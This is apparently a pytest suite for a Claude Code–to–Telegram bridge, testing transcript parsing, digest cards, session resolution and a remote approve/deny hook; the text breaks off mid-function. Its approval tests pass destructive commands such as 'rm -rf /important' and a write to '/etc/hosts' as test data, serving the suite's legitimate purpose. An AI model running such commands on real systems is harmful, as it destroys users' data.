"""Tests for the Claude Desktop bridge (docs/improvements.md item 17).

`grep -rl desktop_bridge tests/` used to return nothing: 1,817 lines implementing
the project's differentiator — hook handling, approval decisions, transcript
parsing, `claude --resume` injection, Telegram transport — had no test at all,
measured at 19% coverage by the rest of the suite touching it incidentally.
Meanwhile all five queued tickets (0023–0027) list `tests/test_desktop_bridge.py`
in their `touches:` frontmatter, so whoever claimed the first one inherited the
whole harness as unscoped work.

This file is that harness. Four fakes, all in the ``bridge`` fixture:

  - **a fake ``~/.claude/projects`` tree** — `desktop_bridge.HOME` is a
    module-level Path read at import, so pointing it at a tmpdir gives real
    transcript files to parse without touching the developer's own sessions;
  - **a stubbed ``_tg_call``** — records outbound Telegram calls instead of
    making them, and is what lets card structure and button payloads be asserted;
  - **a fake ``claude`` binary** — a shell script, so the resume and digest paths
    exercise real ``subprocess.run`` plumbing (argv, cwd, env) rather than a mock
    of it;
  - **an isolated bridge DB** — a temp `store` DB with the bridge tables created,
    so approvals, session cards, and follow state persist as they do in
    production.

Covered here: transcript parsing, digest formatting and its no-summarizer
fallback, the approve/deny hook round-trip, short-session-id resolution, and text
routing.
"""

from __future__ import annotations

import json
import logging
import os
import sqlite3
import stat
import threading
import time
from pathlib import Path
from types import SimpleNamespace

import pytest

from telechat_pkg import desktop_bridge as db
from telechat_pkg import store


# ══════════════════════════════════════════════════════════════════════════════
# Harness
# ══════════════════════════════════════════════════════════════════════════════


class FakeTelegram:
    """Records what the bridge would have sent, and answers like Telegram does."""

    def __init__(self):
        self.calls: list[tuple[str, dict]] = []
        self._next_message_id = 1000
        self.fail_all = False

    def __call__(self, method: str, **params):
        self.calls.append((method, params))
        if self.fail_all:
            return None
        self._next_message_id += 1
        return {"ok": True, "result": {"message_id": self._next_message_id}}

    # ── assertions helpers ──

    @property
    def sent(self) -> list[dict]:
        """Params of every sendMessage call, in order."""
        return [p for m, p in self.calls if m == "sendMessage"]

    @property
    def texts(self) -> list[str]:
        return [p.get("text", "") for p in self.sent]

    def buttons(self, index: int = -1) -> list[dict]:
        """Flattened inline-keyboard buttons of the index-th sendMessage."""
        markup = self.sent[index].get("reply_markup")
        if not markup:
            return []
        if isinstance(markup, str):
            markup = json.loads(markup)
        return [b for row in markup["inline_keyboard"] for b in row]

    def callback_data(self, index: int = -1) -> list[str]:
        return [b["callback_data"] for b in self.buttons(index)]


class BridgeHarness:
    """Fake home + fake claude + fake Telegram + isolated DB."""

    def __init__(self, home: Path, tg: FakeTelegram, claude_bin: Path):
        self.home = home
        self.tg = tg
        self.claude_bin = claude_bin
        self.projects = home / ".claude" / "projects"

    # ── project directories ──

    def make_cwd(self, name: str = "proj") -> str:
        """Create a real directory to stand in for a session's working directory.

        `claude --resume` is spawned with ``cwd=`` set, so a path that doesn't
        exist makes subprocess raise before the binary runs — tests that assert
        on the resume need a directory that is actually there.
        """
        path = self.home / "projects" / name
        path.mkdir(parents=True, exist_ok=True)
        return str(path)

    # ── transcripts ──

    def write_transcript(self, sid: str, cwd: str, entries: list[dict]) -> Path:
        """Write a Claude Code JSONL transcript for ``sid`` under ``cwd``'s project dir.

        Mirrors the real layout: ~/.claude/projects/<cwd-with-slashes-as-dashes>/<sid>.jsonl
        """
        proj = self.projects / cwd.replace("/", "-")
        proj.mkdir(parents=True, exist_ok=True)
        path = proj / f"{sid}.jsonl"
        path.write_text("\n".join(json.dumps(e) for e in entries) + "\n")
        return path

    def assistant_turn(self, text: str = "", tools: list[str] | None = None, cwd: str = "/tmp/proj") -> dict:
        content = []
        if text:
            content.append({"type": "text", "text": text})
        for name in tools or []:
            content.append({"type": "tool_use", "name": name})
        return {"type": "assistant", "cwd": cwd, "message": {"content": content}}

    def user_turn(self, text: str, cwd: str = "/tmp/proj") -> dict:
        return {"type": "user", "cwd": cwd, "message": {"content": [{"type": "text", "text": text}]}}

    # ── the fake claude binary ──

    def set_claude_output(self, stdout: str = "", stderr: str = "", exit_code: int = 0) -> None:
        """Rewrite the fake `claude` so the next invocation produces this output.

        It also appends its argv, cwd, and a couple of env vars to `invocations`,
        so tests can assert on how the bridge spawned it — that `--resume` gets
        the resolved cwd, that the digest is guarded with
        TELECHAT_BRIDGE_INTERNAL, and so on.
        """
        log = self.home / "claude-invocations.log"
        # One record, one write. Three separate printfs let a reader observe an
        # entry that had its `argv:` line but not yet its `cwd:`/`internal:`
        # lines — wait_for_invocation counts records, so it returned as soon as
        # the first line landed and the assertion on a later line then failed at
        # random. Building the whole record first and emitting it with a single
        # printf makes the append atomic in practice.
        script = f"""#!/bin/sh
record="argv:"
for a in "$@"; do record="$record $a"; done
record="$record
cwd: $(pwd)
internal: ${{TELECHAT_BRIDGE_INTERNAL:-}}
"
printf '%s' "$record" >> {log}
cat <<'CLAUDE_STDOUT_EOF'
{stdout}
CLAUDE_STDOUT_EOF
cat <<'CLAUDE_STDERR_EOF' >&2
{stderr}
CLAUDE_STDERR_EOF
exit {exit_code}
"""
        self.claude_bin.write_text(script)
        self.claude_bin.chmod(self.claude_bin.stat().st_mode | stat.S_IEXEC)

    @property
    def invocations(self) -> list[str]:
        """Complete invocation records, oldest first.

        Only records carrying every field are returned. Belt to the atomic
        write's braces: a half-written entry must never be counted, or a test
        asserting on a field can win the race to the file.
        """
        log = self.home / "claude-invocations.log"
        if not log.exists():
            return []
        return [
            block.strip()
            for block in log.read_text().split("argv:")
            if block.strip() and "internal:" in block
        ]

    def wait_for_invocation(self, count: int = 1, timeout: float = 10.0) -> bool:
        """The resume path runs on a daemon thread — wait for it rather than sleeping."""
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if len(self.invocations) >= count:
                return True
            time.sleep(0.02)
        return False

    def wait_for_send(self, count: int = 1, timeout: float = 10.0) -> bool:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if len(self.tg.sent) >= count:
                return True
            time.sleep(0.02)
        return False

    def wait_for_text(self, needle: str, timeout: float = 10.0) -> bool:
        """Wait for a sent message containing ``needle``.

        Prefer this over :meth:`wait_for_send` when asserting on content produced
        by the resume path. `_run_resume_background` spawns a daemon thread that
        resolves ``_tg_call`` at call time, so a thread left over from an earlier
        test posts into *this* test's fake — which can satisfy a bare count check
        before the message under test has actually arrived.
        """
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if any(needle in t for t in self.tg.texts):
                return True
            time.sleep(0.02)
        return False


@pytest.fixture
def bridge(tmp_path, monkeypatch):
    home = tmp_path / "home"
    (home / ".claude" / "projects").mkdir(parents=True)
    (home / ".telechat").mkdir(parents=True)

    # A .env the bridge can read a chat id and token out of, so _tg_send doesn't
    # bail before reaching the stubbed transport.
    (home / ".telechat" / ".env").write_text(
        "TELEGRAM_BOT_TOKEN=test-token\nTELEGRAM_CHAT_ID=424242\n"
    )

    monkeypatch.setattr(db, "HOME", home)
    monkeypatch.setattr(db, "TELECHAT_HOME", home / ".telechat")

    claude_bin = home / "claude"
    claude_bin.write_text("#!/bin/sh\nexit 0\n")
    claude_bin.chmod(0o755)
    monkeypatch.setattr(db, "_find_claude_bin", lambda: str(claude_bin))

    tg = FakeTelegram()
    monkeypatch.setattr(db, "_tg_call", tg)

    # Isolated DB with the bridge tables. _SCHEMA_READY is a module global that
    # would otherwise skip creation against this fresh database.
    store.shutdown_writer(timeout=2.0)
    orig_db_path, orig_local = store.DB_PATH, store._local
    store.DB_PATH = str(tmp_path / "bridge_test.db")
    store._local = threading.local()
    store.init_db()
    monkeypatch.setattr(db, "_SCHEMA_READY", False)
    db.init_bridge_schema(store._get_conn())
    store._get_conn().commit()

    harness = BridgeHarness(home, tg, claude_bin)
    threads_before = set(threading.enumerate())
    yield harness

    # Join anything the test started before tearing the fakes down. The resume
    # path runs on a daemon thread that resolves `_find_claude_bin` and
    # `_tg_call` when it *runs*, not when it is spawned — so a thread outliving
    # its test executes the NEXT test's fake claude and appends to that test's
    # invocation log, which showed up as rare, unreproducible failures on
    # `invocations[0]`. Waiting here keeps each test's side effects its own.
    for thread in set(threading.enumerate()) - threads_before:
        thread.join(timeout=10.0)

    store.shutdown_writer(timeout=2.0)
    store._reset_conn_state()
    store.DB_PATH = orig_db_path
    store._local = orig_local


@pytest.fixture
def no_summarizer(monkeypatch):
    """Force the digest path's fallback — as when the model is unavailable."""
    monkeypatch.setattr(db, "_summarize", lambda raw: None)


# ══════════════════════════════════════════════════════════════════════════════
# 1. Transcript parsing
# ══════════════════════════════════════════════════════════════════════════════


class TestTranscriptParsing:
    def test_finds_transcript_by_explicit_path(self, bridge):
        path = bridge.write_transcript("sid-a", "/tmp/proj", [bridge.assistant_turn("hi")])
        assert db._find_transcript({"transcript_path": str(path)}) == path

    def test_finds_transcript_from_session_and_cwd(self, bridge):
        path = bridge.write_transcript("sid-b", "/tmp/proj", [bridge.assistant_turn("hi")])
        found = db._find_transcript({"session_id": "sid-b", "cwd": "/tmp/proj"})
        assert found == path

    def test_finds_transcript_by_sid_when_cwd_is_wrong(self, bridge):
        # A hook can fire with a stale subdirectory as cwd; the sid still locates it.
        path = bridge.write_transcript("sid-c", "/tmp/proj", [bridge.assistant_turn("hi")])
        found = db._find_transcript({"session_id": "sid-c", "cwd": "/somewhere/else"})
        assert found == path

    def test_missing_transcript_path_falls_through_rather_than_returning_it(self, bridge):
        assert db._find_transcript({"transcript_path": "/no/such/file.jsonl"}) is None

    def test_last_assistant_text_reads_the_newest_turn(self, bridge):
        path = bridge.write_transcript("sid-d", "/tmp/proj", [
            bridge.assistant_turn("first answer"),
            bridge.user_turn("follow-up"),
            bridge.assistant_turn("second answer"),
        ])
        assert db._last_assistant_text(path) == "second answer"

    def test_last_assistant_text_skips_a_tool_only_turn_for_a_text_one(self, bridge):
        path = bridge.write_transcript("sid-e", "/tmp/proj", [
            bridge.assistant_turn("the actual answer"),
            bridge.assistant_turn(tools=["Read", "Grep"]),
        ])
        # The newest turn has no text, so its tool names are reported.
        assert db._last_assistant_text(path) == "(ran tools: Read, Grep)"

    def test_last_assistant_text_truncates_at_max_chars(self, bridge):
        path = bridge.write_transcript("sid-f", "/tmp/proj", [bridge.assistant_turn("x" * 500)])
        out = db._last_assistant_text(path, max_chars=50)
        assert len(out) == 51  # 50 chars + the ellipsis
        assert out.endswith("…")

    def test_malformed_lines_are_skipped_not_fatal(self, bridge):
        # Transcripts are appended to live; a torn final line is normal.
        proj = bridge.projects / "-tmp-proj"
        proj.mkdir(parents=True, exist_ok=True)
        path = proj / "sid-g.jsonl"
        path.write_text(
            json.dumps(bridge.assistant_turn("good turn")) + "\n"
            + '{"type": "assistant", "message": {"content": [{"type": "te\n'
        )
        assert db._last_assistant_text(path) == "good turn"

    def test_no_transcript_yields_none_rather_than_raising(self, bridge):
        assert db._last_assistant_text(None) is None
        assert db._last_assistant_text(Path("/no/such/file.jsonl")) is None

    def test_transcript_with_no_assistant_turn_yields_none(self, bridge):
        path = bridge.write_transcript("sid-h", "/tmp/proj", [bridge.user_turn("only me")])
        assert db._last_assistant_text(path) is None

    def test_resolve_session_cwd_reads_the_true_cwd_from_the_transcript(self, bridge):
        # This is what stops `claude --resume` failing with "No conversation found":
        # the payload cwd can be a subdirectory, the transcript records the real one.
        bridge.write_transcript("sid-i", "/tmp/proj", [
            bridge.assistant_turn("hi", cwd="/tmp/proj"),
        ])
        assert db._resolve_session_cwd("sid-i", fallback="/tmp/proj/sub") == "/tmp/proj"

    def test_resolve_session_cwd_falls_back_when_there_is_no_transcript(self, bridge):
        assert db._resolve_session_cwd("unknown-sid", fallback="/tmp/x") == "/tmp/x"
        assert db._resolve_session_cwd("unknown-sid") is None

    def test_tail_reader_agrees_with_the_full_reader(self, bridge):
        path = bridge.write_transcript("sid-j", "/tmp/proj", [
            bridge.assistant_turn("a short answer"),
        ])
        assert db._tail_last_assistant(path, max_chars=70) == "a short answer"

    def test_tail_reader_handles_a_file_larger_than_its_window(self, bridge):
        # It seeks to the last 64KiB, which can land mid-line — the partial line
        # must be skipped rather than crashing the read.
        entries = [bridge.assistant_turn("filler " * 200) for _ in range(80)]
        entries.append(bridge.assistant_turn("the newest answer"))
        path = bridge.write_transcript("sid-k", "/tmp/proj", entries)
        assert path.stat().st_size > 65536
        assert db._tail_last_assistant(path, max_chars=70) == "the newest answer"

    def test_session_status_reports_busy_for_a_fresh_transcript(self, bridge):
        bridge.write_transcript("sid-l", "/tmp/proj", [bridge.assistant_turn("working")])
        status = db._session_status("sid-l")
        assert status["busy"] is True          # just written, so mid-turn
        assert status["last"] == "working"

    def test_session_status_reports_idle_for_an_old_transcript(self, bridge):
        path = bridge.write_transcript("sid-m", "/tmp/proj", [bridge.assistant_turn("done")])
        old = time.time() - (db._BUSY_WINDOW_SECS + 60)
        os.utime(path, (old, old))
        assert db._session_status("sid-m")["busy"] is False

    def test_session_status_of_an_unknown_session_is_not_busy(self, bridge):
        assert db._session_status("nope") == {"busy": False, "last": None}


# ══════════════════════════════════════════════════════════════════════════════
# 2. Digest formatting and the no-summarizer fallback
# ══════════════════════════════════════════════════════════════════════════════


class TestDigestFormatting:
    def test_status_word_becomes_an_icon_and_the_rest_becomes_the_body(self):
        text, has_decision = db._format_digest("DONE\nRefactored the parser and tests pass.")
        assert text.startswith(db._STATUS_ICONS["DONE"])
        assert "*DONE*" in text
        assert "Refactored the parser" in text
        assert has_decision is False

    def test_decision_line_is_pulled_out_and_flagged(self):
        text, has_decision = db._format_digest(
            "NEEDS DECISION\nTwo migration paths are possible.\n"
            "DECISION: Should I use the in-place migration or a copy?"
        )
        assert has_decision is True
        assert "NEEDS YOU" in text
        assert "in-place migration" in text

    def test_a_status_of_needs_decision_counts_even_without_a_decision_line(self):
        _, has_decision = db._format_digest("NEEDS DECISION\nWaiting on you.")
        assert has_decision is True

    def test_unrecognised_first_line_defaults_to_update_and_keeps_the_line(self):
        text, has_decision = db._format_digest("Some prose with no status word.")
        assert "*UPDATE*" in text
        assert "Some prose" in text
        assert has_decision is False

    def test_empty_digest_does_not_raise(self):
        text, has_decision = db._format_digest("")
        assert has_decision is False
        assert isinstance(text, str)

    def test_markdown_metacharacters_are_neutralised(self):
        # The cards are sent with parse_mode=Markdown, so an unbalanced * or _
        # from model output would make Telegram reject the whole message.
        text, _ = db._format_digest("DONE\nEdited *a_file* with `backticks` and [brackets]")
        body = text.split("\n", 1)[1]
        for ch in ("`", "*", "_", "[", "]"):
            assert ch not in body

    def test_meta_response_is_recognised_as_the_model_talking_back(self):
        assert db._looks_like_meta_response("I don't have any content to summarize.")
        assert db._looks_like_meta_response("Please provide the text you'd like summarized")
        assert not db._looks_like_meta_response("DONE\nRefactored the parser.")

    def test_summarize_declines_input_below_the_minimum(self, bridge):
        assert db._summarize("tiny") is None
        assert bridge.invocations == []  # and doesn't spawn claude for it

    def test_summarize_returns_the_models_text(self, bridge):
        bridge.set_claude_output(stdout="DONE\nAll set.")
        out = db._summarize("x" * (db._DIGEST_MIN_CHARS + 50))
        assert out == "DONE\nAll set."

    def test_summarize_guards_its_own_hooks_from_re_notifying(self, bridge):
        bridge.set_claude_output(stdout="DONE\nAll set.")
        db._summarize("x" * (db._DIGEST_MIN_CHARS + 50))
        # Without TELECHAT_BRIDGE_INTERNAL the digest's own Stop hook would fire
        # a notification about the digest — a feedback loop.
        assert "internal: 1" in bridge.invocations[0]

    def test_summarize_rejects_a_meta_response_so_the_caller_falls_back(self, bridge):
        bridge.set_claude_output(stdout="I don't have any content to summarize.")
        assert db._summarize("x" * (db._DIGEST_MIN_CHARS + 50)) is None

    def test_summarize_survives_a_failing_binary(self, bridge):
        bridge.set_claude_output(stderr="boom", exit_code=1)
        assert db._summarize("x" * (db._DIGEST_MIN_CHARS + 50)) is None


class TestDigestCard:
    def test_card_carries_status_use_session_and_full_output_buttons(self, bridge):
        bridge.set_claude_output(stdout="DONE\nFinished the refactor.")
        r = db._digest_card("✅ *Stop*", "x" * 200, session_short="abcd1234")
        assert r and r["ok"]
        data = bridge.tg.callback_data()
        assert "bridge:act:abcd1234:status" in data
        assert "bridge:use:abcd1234" in data
        assert any(d.startswith("bridge:full:") for d in data)

    def test_proceed_button_appears_only_for_a_decision(self, bridge):
        bridge.set_claude_output(stdout="NEEDS DECISION\nPick one.\nDECISION: A or B?")
        db._digest_card("🔔 *Notification*", "x" * 200, session_short="abcd1234")
        assert "bridge:act:abcd1234:proceed" in bridge.tg.callback_data()

        bridge.tg.calls.clear()
        bridge.set_claude_output(stdout="DONE\nNothing needed.")
        db._digest_card("✅ *Stop*", "x" * 200, session_short="abcd1234")
        assert "bridge:act:abcd1234:proceed" not in bridge.tg.callback_data()

    def test_without_a_session_only_the_full_output_button_is_offered(self, bridge):
        bridge.set_claude_output(stdout="DONE\nFinished.")
        db._digest_card("✅ *Stop*", "x" * 200, session_short=None)
        data = bridge.tg.callback_data()
        assert len(data) == 1 and data[0].startswith("bridge:full:")

    def test_full_output_button_resolves_to_the_original_text(self, bridge):
        bridge.set_claude_output(stdout="DONE\nSummarised.")
        raw = "the complete untruncated output " * 40
        db._digest_card("✅ *Stop*", raw, session_short="abcd1234")
        token = next(d for d in bridge.tg.callback_data() if d.startswith("bridge:full:"))
        assert db._get_full_output(token.split(":")[-1]) == raw

    def test_no_summarizer_falls_back_to_the_full_text(self, bridge, no_summarizer):
        raw = "line one\nline two\nline three"
        assert db._digest_card("✅ *Stop*", raw, session_short="abcd1234") is None
        # The fallback must still deliver the content — a failed digest cannot be
        # allowed to swallow the assistant's actual output.
        assert any("line two" in t for t in bridge.tg.texts)

    def test_unknown_full_output_token_yields_none(self, bridge):
        assert db._get_full_output("no-such-token") is None

    def test_full_output_table_is_bounded(self, bridge):
        for i in range(205):
            db._store_full_output(f"content {i}")
        conn = store._get_conn()
        count = conn.execute("SELECT COUNT(*) FROM bridge_full_outputs").fetchone()[0]
        assert count <= 200


# ══════════════════════════════════════════════════════════════════════════════
# 3. Short-session-id resolution
# ══════════════════════════════════════════════════════════════════════════════


class TestShortSessionResolution:
    def _record_card(self, sid: str, cwd: str, message_id: int = 1) -> None:
        conn = store._get_conn()
        conn.execute(
            "INSERT OR REPLACE INTO bridge_session_messages(message_id,session_id,cwd,created_at)"
            " VALUES(?,?,?,?)",
            (message_id, sid, cwd, "2026-07-30T00:00:00"),
        )
        conn.commit()

    def test_resolves_a_short_id_from_a_notified_session(self, bridge):
        self._record_card("abcd1234-full-session-id", "/tmp/proj")
        assert db.resolve_short_session("abcd1234") == ("abcd1234-full-session-id", "/tmp/proj")

    def test_resolution_is_case_insensitive_and_trims(self, bridge):
        self._record_card("abcd1234-full-session-id", "/tmp/proj")
        assert db.resolve_short_session("  ABCD1234 ") is not None

    def test_newest_card_wins_when_a_prefix_matches_several(self, bridge):
        conn = store._get_conn()
        conn.execute(
            "INSERT INTO bridge_session_messages(message_id,session_id,cwd,created_at) VALUES(?,?,?,?)",
            (1, "abcd1234-older", "/tmp/old", "2026-07-01T00:00:00"),
        )
        conn.execute(
            "INSERT INTO bridge_session_messages(message_id,session_id,cwd,created_at) VALUES(?,?,?,?)",
            (2, "abcd1234-newer", "/tmp/new", "2026-07-30T00:00:00"),
        )
        conn.commit()
        assert db.resolve_short_session("abcd1234")[0] == "abcd1234-newer"

    def test_falls_back_to_the_transcript_tree_for_a_session_never_notified(self, bridge):
        # The point of the on-disk fallback: any existing session can be resumed,
        # not only ones the bridge has already sent a card for.
        bridge.write_transcript("ffff9999-never-notified", "/tmp/other", [
            bridge.assistant_turn("hello", cwd="/tmp/other"),
        ])
        assert db.resolve_short_session("ffff9999") == (
            "ffff9999-never-notified", "/tmp/other",
        )

    def test_empty_or_unknown_short_id_yields_none(self, bridge):
        assert db.resolve_short_session("") is None
        assert db.resolve_short_session("   ") is None
        assert db.resolve_short_session("deadbeef") is None


class TestCurrentSession:
    def test_set_get_and_clear_round_trip(self, bridge):
        assert db.get_current_session() == (None, None)
        db.set_current_session("sid-1", "/tmp/proj")
        assert db.get_current_session() == ("sid-1", "/tmp/proj")
        db.set_current_session(None, None)
        assert db.get_current_session() == (None, None)

    def test_a_partial_pin_clears_rather_than_half_setting(self, bridge):
        db.set_current_session("sid-1", "/tmp/proj")
        db.set_current_session("sid-2", None)
        assert db.get_current_session() == (None, None)


# ══════════════════════════════════════════════════════════════════════════════
# 4. The approve/deny hook round-trip
# ══════════════════════════════════════════════════════════════════════════════


class TestApproveHook:
    def _decide(self, req_id: str, decision: str) -> None:
        conn = store._get_conn()
        conn.execute(
            "UPDATE bridge_approvals SET decision=?, decided_at=? WHERE request_id=?",
            (decision, "2026-07-30T00:00:00", req_id),
        )
        conn.commit()

    def _answer_when_asked(self, decision: str) -> None:
        """Decide as soon as the hook records its request, from another thread."""
        def wait_and_decide():
            deadline = time.monotonic() + 10
            while time.monotonic() < deadline:
                conn = sqlite3.connect(store.DB_PATH)
                try:
                    row = conn.execute(
                        "SELECT request_id FROM bridge_approvals WHERE decision IS NULL"
                    ).fetchone()
                    if row:
                        conn.execute(
                            "UPDATE bridge_approvals SET decision=?, decided_at=? WHERE request_id=?",
                            (decision, "2026-07-30T00:00:00", row[0]),
                        )
                        conn.commit()
                        return
                finally:
                    conn.close()
                time.sleep(0.02)
        threading.Thread(target=wait_and_decide, daemon=True).start()

    def test_passes_through_when_approve_mode_is_off(self, bridge):
        result = db.hook_approve({"cwd": "/tmp/proj", "session_id": "sid", "tool_name": "Bash"})
        assert result is None
        assert bridge.tg.sent == []  # and doesn't bother the user

    def test_passes_through_when_there_is_no_cwd(self, bridge):
        db.set_approve_mode("/tmp/proj", True)
        assert db.hook_approve({"session_id": "sid", "tool_name": "Bash"}) is None

    def test_approval_returns_an_allow_decision(self, bridge):
        db.set_approve_mode("/tmp/proj", True)
        self._answer_when_asked("y")
        result = db.hook_approve({
            "cwd": "/tmp/proj", "session_id": "abcd1234-x",
            "tool_name": "Bash", "tool_input": {"command": "rm -rf build"},
        })
        assert result["hookSpecificOutput"]["permissionDecision"] == "allow"

    def test_denial_returns_a_deny_decision_with_a_reason(self, bridge):
        db.set_approve_mode("/tmp/proj", True)
        self._answer_when_asked("n")
        result = db.hook_approve({
            "cwd": "/tmp/proj", "session_id": "abcd1234-x",
            "tool_name": "Write", "tool_input": {"file_path": "/etc/hosts"},
        })
        out = result["hookSpecificOutput"]
        assert out["permissionDecision"] == "deny"
        assert out["permissionDecisionReason"]

    def test_the_card_offers_approve_and_deny_for_the_same_request(self, bridge):
        db.set_approve_mode("/tmp/proj", True)
        self._answer_when_asked("y")
        db.hook_approve({
            "cwd": "/tmp/proj", "session_id": "abcd1234-x",
            "tool_name": "Bash", "tool_input": {"command": "ls"},
        })
        data = [d for d in bridge.tg.callback_data(0) if d.startswith("bridge:appr:")]
        assert len(data) == 2
        req_ids = {d.split(":")[2] for d in data}
        assert len(req_ids) == 1                       # both buttons, one request
        assert {d.split(":")[3] for d in data} == {"y", "n"}

    def test_the_prompt_shows_the_command_for_bash(self, bridge):
        db.set_approve_mode("/tmp/proj", True)
        self._answer_when_asked("y")
        db.hook_approve({
            "cwd": "/tmp/proj", "session_id": "abcd1234-x",
            "tool_name": "Bash", "tool_input": {"command": "rm -rf /important"},
        })
        assert "rm -rf /important" in bridge.tg.texts[0]

    def test_the_prompt_shows_the_path_for_a_write(self, bridge):
        db.set_approve_mode("/tmp/proj", True)
        self._answer_when_asked("y")
        db.hook_approve({
            "cwd": "/tmp/proj", "session_id": "abcd1234-x",
            "tool_name": "Edit", "tool_input": {"file_path": "/tmp/proj/main.py"},
        })
        # Shortened against the project — the card has one line to spend on a path.
        assert "main.py" in bridge.tg.texts[0]

    def test_the_global_toggle_overrides_per_project_settings(self, bridge):
        db._state_set("approve_all", "1")
        assert db.approve_mode_on("/never/configured") is True

    def test_per_project_mode_can_be_turned_back_off(self, bridge):
        db.set_approve_mode("/tmp/proj", True)
        assert db.approve_mode_on("/tmp/proj") is True
        db.set_approve_mode("/tmp/proj", False)
        assert db.approve_mode_on("/tmp/proj") is False

    def test_a_timed_out_request_falls_through_to_the_normal_flow(self, bridge, monkeypatch):
        # The README documents fail-open after five minutes. Nobody decides here,
        # so the hook must return None rather than blocking or denying.
        db.set_approve_mode("/tmp/proj", True)
        clock = iter([0.0, 0.0, 10_000.0, 10_000.0, 10_000.0])
        monkeypatch.setattr(db.time, "time", lambda: next(clock, 10_000.0))
        result = db.hook_approve({
            "cwd": "/tmp/proj", "session_id": "abcd1234-x",
            "tool_name": "Bash", "tool_input": {"command": "ls"},
        })
        assert result is None


# ══════════════════════════════════════════════════════════════════════════════
# 4b. Approval timeout policy
#
# Fail-open is a defensible default for a personal tool, but someone who turns
# approval on *because they are away from the machine* wants the opposite. The
# choice is BRIDGE_APPROVAL_TIMEOUT_ACTION; the default is unchanged.
# ══════════════════════════════════════════════════════════════════════════════


class TestApprovalTimeoutSettings:
    def test_defaults_are_five_minutes_and_fallthrough(self, monkeypatch):
        monkeypatch.delenv("BRIDGE_APPROVAL_TIMEOUT", raising=False)
        monkeypatch.delenv("BRIDGE_APPROVAL_TIMEOUT_ACTION", raising=False)
        assert db._approval_timeout() == 300.0
        assert db._approval_timeout_action() == "fallthrough"

    def test_timeout_is_configurable(self, monkeypatch):
        monkeypatch.setenv("BRIDGE_APPROVAL_TIMEOUT", "45")
        assert db._approval_timeout() == 45.0

    @pytest.mark.parametrize("bad", ["", "soon", "5 minutes", "0", "-30"])
    def test_a_bad_timeout_falls_back_to_the_default(self, monkeypatch, bad):
        # A zero or negative timeout would resolve every request instantly by
        # policy, silently — a typo must not become a security posture.
        monkeypatch.setenv("BRIDGE_APPROVAL_TIMEOUT", bad)
        assert db._approval_timeout() == 300.0

    @pytest.mark.parametrize("action", ["deny", "allow", "fallthrough"])
    def test_each_action_is_accepted(self, monkeypatch, action):
        monkeypatch.setenv("BRIDGE_APPROVAL_TIMEOUT_ACTION", action)
        assert db._approval_timeout_action() == action

    @pytest.mark.parametrize("action", ["DENY", " Deny ", "Allow"])
    def test_the_action_is_case_and_space_insensitive(self, monkeypatch, action):
        monkeypatch.setenv("BRIDGE_APPROVAL_TIMEOUT_ACTION", action)
        assert db._approval_timeout_action() == action.strip().lower()

    @pytest.mark.parametrize("action", ["block", "", "yes", "refuse"])
    def test_an_unrecognised_action_means_the_old_behaviour(self, monkeypatch, action):
        monkeypatch.setenv("BRIDGE_APPROVAL_TIMEOUT_ACTION", action)
        assert db._approval_timeout_action() == "fallthrough"


class TestApprovalTimeoutBehaviour:
    """The hook's actual return value when nobody taps."""

    @staticmethod
    def _expire(monkeypatch):
        clock = iter([0.0, 0.0, 10_000.0, 10_000.0, 10_000.0])
        monkeypatch.setattr(db.time, "time", lambda: next(clock, 10_000.0))

    @staticmethod
    def _ask():
        return db.hook_approve({
            "cwd": "/tmp/proj", "session_id": "abcd1234-x",
            "tool_name": "Bash", "tool_input": {"command": "ls"},
        })

    def test_deny_action_denies_and_says_why(self, bridge, monkeypatch):
        db.set_approve_mode("/tmp/proj", True)
        monkeypatch.setenv("BRIDGE_APPROVAL_TIMEOUT_ACTION", "deny")
        self._expire(monkeypatch)
        out = self._ask()["hookSpecificOutput"]
        assert out["permissionDecision"] == "deny"
        # The reason reaches Claude Code's transcript — it should name the
        # setting, not read as an unexplained refusal.
        assert "BRIDGE_APPROVAL_TIMEOUT_ACTION" in out["permissionDecisionReason"]

    def test_allow_action_allows(self, bridge, monkeypatch):
        db.set_approve_mode("/tmp/proj", True)
        monkeypatch.setenv("BRIDGE_APPROVAL_TIMEOUT_ACTION", "allow")
        self._expire(monkeypatch)
        assert self._ask()["hookSpecificOutput"]["permissionDecision"] == "allow"

    def test_an_answer_still_wins_over_the_timeout_policy(self, bridge, monkeypatch):
        # Policy applies only when nobody decided; a tap must not be overridden.
        db.set_approve_mode("/tmp/proj", True)
        monkeypatch.setenv("BRIDGE_APPROVAL_TIMEOUT_ACTION", "deny")

        def approve_as_soon_as_it_is_asked():
            deadline = time.monotonic() + 10
            while time.monotonic() < deadline:
                conn = sqlite3.connect(store.DB_PATH)
                try:
                    row = conn.execute(
                        "SELECT request_id FROM bridge_approvals WHERE decision IS NULL"
                    ).fetchone()
                    if row:
                        conn.execute(
                            "UPDATE bridge_approvals SET decision='y', decided_at=?"
                            " WHERE request_id=?",
                            ("2026-07-31T00:00:00", row[0]),
                        )
                        conn.commit()
                        return
                finally:
                    conn.close()
                time.sleep(0.02)

        threading.Thread(target=approve_as_soon_as_it_is_asked, daemon=True).start()
        assert self._ask()["hookSpecificOutput"]["permissionDecision"] == "allow"

    @pytest.mark.parametrize("action,needle", [
        ("deny", "Auto-denies"),
        ("allow", "Auto-approves"),
        ("fallthrough", "desktop prompt"),
    ])
    def test_the_card_tells_the_user_what_inaction_will_do(
        self, bridge, monkeypatch, action, needle
    ):
        db.set_approve_mode("/tmp/proj", True)
        monkeypatch.setenv("BRIDGE_APPROVAL_TIMEOUT_ACTION", action)
        self._expire(monkeypatch)
        self._ask()
        assert needle in bridge.tg.texts[0]

    def test_a_short_timeout_is_honoured(self, bridge, monkeypatch):
        # Real clock, no stubbing: the hook must return promptly rather than
        # sitting on the hardcoded five minutes.
        db.set_approve_mode("/tmp/proj", True)
        monkeypatch.setenv("BRIDGE_APPROVAL_TIMEOUT", "0.2")
        started = time.monotonic()
        assert self._ask() is None
        assert time.monotonic() - started < 10


# ══════════════════════════════════════════════════════════════════════════════
# 5. Text routing
# ══════════════════════════════════════════════════════════════════════════════


class FakeMessage:
    def __init__(self, text: str, message_id: int = 1, reply_to=None):
        self.text = text
        self.message_id = message_id
        self.reply_to_message = reply_to
        self.replies: list[str] = []

    async def reply_text(self, text, **kwargs):
        self.replies.append(text)
        return SimpleNamespace(message_id=self.message_id + 1000)


def _update(text: str, reply_to=None) -> SimpleNamespace:
